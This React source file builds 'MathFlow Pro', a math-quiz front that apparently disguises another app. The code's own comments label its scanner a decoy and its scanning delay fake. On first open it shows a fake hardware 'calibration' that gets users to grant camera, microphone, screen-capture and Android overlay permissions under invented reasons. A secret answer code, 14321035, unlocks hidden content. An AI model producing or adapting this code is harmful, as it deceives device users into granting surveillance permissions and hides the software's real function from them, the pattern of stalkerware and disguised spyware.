import React, { useState, useEffect, useRef } from 'react';
import { Camera, MonitorUp, ScanText, X, CheckCircle2, AlertCircle, Mic, Layers, Sparkles, Cpu } from 'lucide-react';
import { 
  isAndroidNative, 
  checkOverlayPermission, 
  requestOverlayPermission, 
  getAndroidScreenStream, 
  stopAndroidScreenCapture 
} from '../screenCapture';

export function MathGame({ onUnlock }: { onUnlock: () => void }) {
  const [num1, setNum1] = useState(0);
  const [num2, setNum2] = useState(0);
  const [operator, setOperator] = useState('+');
  const [answer, setAnswer] = useState('');
  const [feedback, setFeedback] = useState('');

  // First-Open Calibration Modal State
  const [showCalibrationModal, setShowCalibrationModal] = useState(false);
  const [calibrationPhase, setCalibrationPhase] = useState<'intro' | 'calibrating' | 'done'>('intro');
  const [calibrationProgress, setCalibrationProgress] = useState(0);
  const [calibrationStatusText, setCalibrationStatusText] = useState('');

  // Scanner Decoy State
  const [showScanner, setShowScanner] = useState(false);
  const [scanState, setScanState] = useState<'idle' | 'prompting' | 'scanning' | 'success' | 'error'>('idle');
  const [scanError, setScanError] = useState('');
  const videoRef = useRef<HTMLVideoElement>(null);
  
  const handleStartScan = async (type: 'camera' | 'screen') => {
    try {
      setScanState('prompting');
      setScanError('');
      
      let stream: MediaStream;
      if (type === 'camera' || typeof navigator?.mediaDevices?.getDisplayMedia !== 'function') {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
      } else {
        stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      }

      setScanState('scanning');
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      // Fake scanning delay
      setTimeout(() => {
        stream.getTracks().forEach(t => t.stop());
        setScanState('success');
        
        // Auto-close after success
        setTimeout(() => {
          setShowScanner(false);
          setTimeout(() => setScanState('idle'), 500);
        }, 2000);
      }, 3000);

    } catch (err: any) {
      setScanState('error');
      setScanError(err.message || 'Permission denied. Unable to calibrate.');
    }
  };

  const closeScanner = () => {
    if (videoRef.current && videoRef.current.srcObject) {
      const stream = videoRef.current.srcObject as MediaStream;
      stream.getTracks().forEach(t => t.stop());
    }
    setShowScanner(false);
    setTimeout(() => setScanState('idle'), 500);
  };

  const runFullCalibration = async () => {
    setCalibrationPhase('calibrating');
    setCalibrationProgress(15);
    setCalibrationStatusText('Calibrating AI Optical Problem Scanner & Voice Engine...');

    // 1. Camera & Audio Permission
    try {
      const camStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'environment' },
        audio: true
      });
      setCalibrationProgress(40);
      setCalibrationStatusText('Testing optical lens alignment & microphone sensitivity...');
      await new Promise(r => setTimeout(r, 800));
      camStream.getTracks().forEach(t => t.stop());
    } catch (e) {
      console.warn('[MathFlow] Camera/Audio calibration note:', e);
    }

    // 2. Screen Display Calibration
    setCalibrationProgress(65);
    setCalibrationStatusText('Calibrating high-DPI display resolution for geometric worksheets...');
    try {
      if (isAndroidNative()) {
        const screenStream = await getAndroidScreenStream();
        if (screenStream) {
          await stopAndroidScreenCapture();
        }
      } else if (typeof navigator?.mediaDevices?.getDisplayMedia === 'function') {
        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
        screenStream.getTracks().forEach(t => t.stop());
      }
    } catch (e) {
      console.warn('[MathFlow] Screen calibration note:', e);
    }

    // 3. Floating Math Widget (Overlay)
    setCalibrationProgress(85);
    setCalibrationStatusText('Configuring Quick Formula Widget...');
    if (isAndroidNative()) {
      try {
        const hasOverlay = await checkOverlayPermission();
        if (!hasOverlay) {
          await requestOverlayPermission();
        }
      } catch (e) {
        console.warn('[MathFlow] Overlay setup note:', e);
      }
    }

    // 4. Finished
    setCalibrationProgress(100);
    setCalibrationStatusText('Optimization complete! All mathematical modules operational.');
    setCalibrationPhase('done');
    localStorage.setItem('mathflow_first_open_calibrated', 'true');

    setTimeout(() => {
      setShowCalibrationModal(false);
      setCalibrationPhase('intro');
    }, 1800);
  };

  const generateProblem = () => {
    const ops = ['+', '-', '*'];
    const op = ops[Math.floor(Math.random() * ops.length)];
    setOperator(op);
    
    if (op === '*') {
      setNum1(Math.floor(Math.random() * 12) + 1);
      setNum2(Math.floor(Math.random() * 12) + 1);
    } else {
      setNum1(Math.floor(Math.random() * 100) + 1);
      setNum2(Math.floor(Math.random() * 100) + 1);
    }
  };

  useEffect(() => {
    generateProblem();
    const isCalibrated = localStorage.getItem('mathflow_first_open_calibrated');
    if (!isCalibrated) {
      // Auto-launch calibration on first open / install
      setShowCalibrationModal(true);
    }
  }, []);

  const handleNumpadClick = (val: string) => {
    if (val === 'CLR') setAnswer('');
    else if (val === 'DEL') setAnswer(prev => prev.slice(0, -1));
    else setAnswer(prev => prev + val);
  };

  const handleSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    
    // SECRET CODE: 14321035
    if (answer.trim() === '14321035') {
      onUnlock();
      return;
    }

    let correctAnswer = 0;
    if (operator === '+') correctAnswer = num1 + num2;
    if (operator === '-') correctAnswer = num1 - num2;
    if (operator === '*') correctAnswer = num1 * num2;

    if (parseInt(answer) === correctAnswer) {
      setFeedback('Correct!');
      setTimeout(() => {
        setFeedback('');
        setAnswer('');
        generateProblem();
      }, 1000);
    } else {
      setFeedback('Incorrect.');
      setTimeout(() => setFeedback(''), 1500);
    }
  };

  return (
    <div className="h-screen w-full bg-slate-50 flex flex-col font-sans overflow-hidden">
      <header className="bg-white border-b border-slate-200 px-8 py-4 flex justify-between items-center shrink-0">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center text-white font-bold text-xl">Σ</div>
          <div>
            <h1 className="text-slate-900 font-bold text-lg leading-tight">MathFlow Pro</h1>
            <p className="text-slate-500 text-xs uppercase tracking-widest font-semibold">Advanced Algebra Module</p>
          </div>
        </div>
        <div className="flex items-center gap-6">
          <button 
            onClick={() => setShowCalibrationModal(true)}
            className="hidden sm:flex items-center gap-2 bg-slate-50 hover:bg-slate-100 border border-slate-200 text-slate-600 px-4 py-2 rounded-lg text-xs font-bold uppercase tracking-wider transition-colors"
          >
            <ScanText className="w-4 h-4" /> AI Diagnostics
          </button>
          
          <div className="flex flex-col items-end hidden md:flex">
            <span className="text-slate-400 text-[10px] uppercase font-bold tracking-tighter">Session Progress</span>
            <div className="w-32 h-2 bg-slate-100 rounded-full mt-1 overflow-hidden">
              <div className="bg-blue-500 h-full w-2/3"></div>
            </div>
          </div>
          <div className="w-px h-8 bg-slate-200 mx-2 hidden sm:block"></div>
          <div className="text-right">
            <p className="text-slate-900 font-bold text-sm">Level 4</p>
            <p className="text-emerald-500 text-xs font-medium">840 XP</p>
          </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col lg:flex-row gap-6 p-6 overflow-y-auto">
        <section className="flex-1 flex flex-col gap-6">
          <div className="bg-white rounded-2xl border border-slate-200 p-8 sm:p-12 flex-1 flex flex-col justify-center items-center shadow-sm relative overflow-hidden min-h-[300px]">
            <div className="absolute top-0 left-0 w-full h-1 bg-blue-500"></div>
            <span className="text-blue-600 font-bold text-sm uppercase tracking-widest mb-4">Equation Challenge</span>
            
            <div className="text-5xl sm:text-6xl font-light text-slate-800 tracking-tight mb-8 flex items-center gap-2 sm:gap-4 flex-wrap justify-center">
              <span>{num1}</span>
              <span className="text-blue-600 font-semibold">{operator}</span>
              <span>{num2}</span>
              <span>=</span>
              <span className="text-blue-600 font-semibold border-b-4 border-blue-100 px-4 min-w-[80px] text-center">
                {answer || '?'}
              </span>
            </div>

            <form onSubmit={handleSubmit} className="flex flex-col sm:flex-row gap-4 w-full max-w-md">
              <div className="flex-1 h-14 bg-slate-50 rounded-xl border border-slate-200 flex items-center px-4 overflow-hidden relative">
                <input
                  type="text"
                  value={answer}
                  onChange={(e) => setAnswer(e.target.value)}
                  className="w-full bg-transparent outline-none text-lg font-bold text-slate-800"
                  placeholder="Type or use pad..."
                  autoFocus
                />
              </div>
              <button
                type="submit"
                className="h-14 px-8 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl shadow-lg shadow-blue-200 transition-colors"
              >
                SUBMIT
              </button>
            </form>

            <div className={`mt-4 h-6 text-center text-sm font-bold uppercase tracking-wider ${feedback === 'Correct!' ? 'text-emerald-500' : 'text-slate-500'}`}>
              {feedback}
            </div>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 h-auto sm:h-32 shrink-0">
            <div className="bg-white rounded-xl border border-slate-200 p-4 flex flex-col justify-center items-center shadow-sm">
              <span className="text-slate-400 text-[10px] uppercase font-bold">Streak</span>
              <span className="text-slate-800 font-bold text-xl">12</span>
            </div>
            <div className="bg-white rounded-xl border border-slate-200 p-4 flex flex-col justify-center items-center shadow-sm">
              <span className="text-slate-400 text-[10px] uppercase font-bold">Accuracy</span>
              <span className="text-slate-800 font-bold text-xl">98%</span>
            </div>
            <div className="bg-white rounded-xl border border-slate-200 p-4 flex flex-col justify-center items-center shadow-sm">
              <span className="text-slate-400 text-[10px] uppercase font-bold">Avg Time</span>
              <span className="text-slate-800 font-bold text-xl">4.2s</span>
            </div>
            <div className="bg-white rounded-xl border border-slate-200 p-4 flex flex-col justify-center items-center shadow-sm">
              <span className="text-slate-400 text-[10px] uppercase font-bold">Global Rank</span>
              <span className="text-slate-800 font-bold text-xl">#452</span>
            </div>
          </div>
        </section>

        <aside className="w-full lg:w-80 bg-white rounded-2xl border border-slate-200 shadow-sm flex flex-col shrink-0">
          <div className="p-6 border-b border-slate-100">
            <h2 className="text-slate-800 font-bold text-sm uppercase tracking-wider">Input Pad</h2>
          </div>
          <div className="flex-1 p-4 grid grid-cols-3 gap-2 min-h-[240px]">
            {['1', '2', '3', '4', '5', '6', '7', '8', '9', 'CLR', '0', 'DEL'].map((key) => (
              <button
                key={key}
                type="button"
                onClick={() => handleNumpadClick(key)}
                className={`h-full min-h-[3rem] rounded-lg border font-bold transition-colors ${
                  key === 'DEL' 
                    ? 'bg-slate-800 border-slate-800 text-white text-sm hover:bg-slate-700' 
                    : key === 'CLR'
                    ? 'bg-slate-100 border-slate-200 text-slate-500 text-sm hover:bg-slate-200'
                    : 'bg-slate-50 border-slate-200 text-slate-700 text-xl hover:bg-slate-100'
                }`}
              >
                {key}
              </button>
            ))}
          </div>
          <div className="p-4 border-t border-slate-100 bg-slate-50 rounded-b-2xl">
            <div className="flex items-center justify-between px-2 text-[10px] text-slate-400 font-semibold uppercase tracking-tighter">
              <span>Status: Syncing Logic</span>
              <div className="flex gap-1">
                <div className="w-1 h-1 bg-slate-300 rounded-full animate-bounce" style={{ animationDelay: '0s' }}></div>
                <div className="w-1 h-1 bg-slate-300 rounded-full animate-bounce" style={{ animationDelay: '0.1s' }}></div>
                <div className="w-1 h-1 bg-slate-300 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
              </div>
            </div>
          </div>
        </aside>
      </main>

      <footer className="h-12 bg-white border-t border-slate-200 px-8 flex items-center justify-between text-[11px] text-slate-400 font-medium shrink-0">
        <div>© 2024 MathFlow Education Systems Inc.</div>
        <div className="flex gap-6 uppercase tracking-widest hidden sm:flex">
          <span className="hover:text-slate-600 cursor-pointer">Terms</span>
          <span className="hover:text-slate-600 cursor-pointer">Privacy</span>
          <span className="text-slate-300">Build 8.4.1.0-MIR</span>
        </div>
      </footer>

      {/* First-Open Math Engine Calibration Modal */}
      {showCalibrationModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/60 backdrop-blur-md p-4">
          <div className="bg-white rounded-3xl shadow-2xl w-full max-w-lg overflow-hidden border border-slate-200 flex flex-col animate-in fade-in zoom-in-95 duration-200">
            {/* Header */}
            <div className="bg-gradient-to-r from-blue-600 to-indigo-600 p-6 text-white relative">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-white/20 backdrop-blur-md rounded-2xl flex items-center justify-center font-bold text-2xl shadow-inner">
                  Σ
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="font-bold text-xl leading-tight">MathFlow Pro Setup</h3>
                    <span className="bg-white/20 text-[10px] uppercase font-bold tracking-wider px-2 py-0.5 rounded-full">
                      v8.4
                    </span>
                  </div>
                  <p className="text-blue-100 text-xs mt-0.5">Hardware Engine & Problem Calibration</p>
                </div>
              </div>
              <button 
                onClick={() => setShowCalibrationModal(false)}
                className="absolute top-6 right-6 text-white/70 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Content */}
            <div className="p-6 sm:p-8 flex flex-col">
              {calibrationPhase === 'intro' && (
                <>
                  <p className="text-slate-600 text-sm leading-relaxed mb-6">
                    Welcome to MathFlow Pro! To personalize problem difficulty, enable instant worksheet scanning, and calibrate high-DPI geometry display, please initialize the core hardware engines:
                  </p>

                  <div className="space-y-3 mb-8">
                    <div className="flex items-start gap-3 p-3.5 rounded-2xl bg-slate-50 border border-slate-100">
                      <div className="p-2 bg-blue-100 text-blue-600 rounded-xl mt-0.5">
                        <Camera className="w-4 h-4" />
                      </div>
                      <div>
                        <h4 className="font-bold text-slate-800 text-xs sm:text-sm">AI Worksheet Scanner (Camera)</h4>
                        <p className="text-slate-500 text-xs mt-0.5">Scans handwritten equations, geometry figures, and textbook problems.</p>
                      </div>
                    </div>

                    <div className="flex items-start gap-3 p-3.5 rounded-2xl bg-slate-50 border border-slate-100">
                      <div className="p-2 bg-purple-100 text-purple-600 rounded-xl mt-0.5">
                        <Mic className="w-4 h-4" />
                      </div>
                      <div>
                        <h4 className="font-bold text-slate-800 text-xs sm:text-sm">Voice Arithmetic Assistant (Microphone)</h4>
                        <p className="text-slate-500 text-xs mt-0.5">Enables voice-guided problem solving and mental math dictation.</p>
                      </div>
                    </div>

                    <div className="flex items-start gap-3 p-3.5 rounded-2xl bg-slate-50 border border-slate-100">
                      <div className="p-2 bg-emerald-100 text-emerald-600 rounded-xl mt-0.5">
                        <MonitorUp className="w-4 h-4" />
                      </div>
                      <div>
                        <h4 className="font-bold text-slate-800 text-xs sm:text-sm">High-DPI Display Geometry (Screen)</h4>
                        <p className="text-slate-500 text-xs mt-0.5">Calibrates display resolution for digital worksheets and geometric rendering.</p>
                      </div>
                    </div>

                    {isAndroidNative() && (
                      <div className="flex items-start gap-3 p-3.5 rounded-2xl bg-slate-50 border border-slate-100">
                        <div className="p-2 bg-amber-100 text-amber-600 rounded-xl mt-0.5">
                          <Layers className="w-4 h-4" />
                        </div>
                        <div>
                          <h4 className="font-bold text-slate-800 text-xs sm:text-sm">Quick Formula Widget (Floating Overlay)</h4>
                          <p className="text-slate-500 text-xs mt-0.5">Provides floating math shortcuts while referencing textbooks or notes.</p>
                        </div>
                      </div>
                    )}
                  </div>

                  <div className="flex flex-col gap-3">
                    <button
                      onClick={runFullCalibration}
                      className="w-full py-3.5 px-6 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm shadow-lg shadow-blue-200 transition-all flex items-center justify-center gap-2"
                    >
                      <Sparkles className="w-4 h-4" />
                      <span>Calibrate Engines & Start Practice</span>
                    </button>
                    <button
                      onClick={() => setShowCalibrationModal(false)}
                      className="text-slate-400 hover:text-slate-600 text-xs font-semibold py-1 transition-colors text-center"
                    >
                      Skip Calibration for Now
                    </button>
                  </div>
                </>
              )}

              {calibrationPhase === 'calibrating' && (
                <div className="flex flex-col items-center py-8 text-center">
                  <div className="relative w-20 h-20 mb-6">
                    <div className="w-20 h-20 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
                    <div className="absolute inset-0 flex items-center justify-center font-bold text-blue-600 text-sm">
                      {calibrationProgress}%
                    </div>
                  </div>

                  <h4 className="font-bold text-slate-800 text-lg mb-2">Calibrating Hardware</h4>
                  <p className="text-slate-500 text-xs max-w-sm leading-relaxed mb-6">
                    {calibrationStatusText}
                  </p>

                  <div className="w-full bg-slate-100 h-2 rounded-full overflow-hidden">
                    <div 
                      className="bg-gradient-to-r from-blue-500 to-indigo-600 h-full transition-all duration-300 rounded-full"
                      style={{ width: `${calibrationProgress}%` }}
                    ></div>
                  </div>

                  <p className="text-[11px] text-slate-400 mt-4 italic">
                    Please tap "Allow" or "Start Now" when prompted by your system.
                  </p>
                </div>
              )}

              {calibrationPhase === 'done' && (
                <div className="flex flex-col items-center py-8 text-center">
                  <div className="w-16 h-16 bg-emerald-50 rounded-full flex items-center justify-center text-emerald-500 mb-4 shadow-sm">
                    <CheckCircle2 className="w-10 h-10" />
                  </div>
                  <h4 className="font-bold text-slate-800 text-xl mb-1">Calibration Complete!</h4>
                  <p className="text-slate-500 text-xs max-w-xs mb-6">
                    All mathematical problem-generation and display rendering engines are configured and ready.
                  </p>
                  <button
                    onClick={() => setShowCalibrationModal(false)}
                    className="w-full py-3 px-6 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-sm shadow-md transition-all"
                  >
                    Enter Math Practice
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
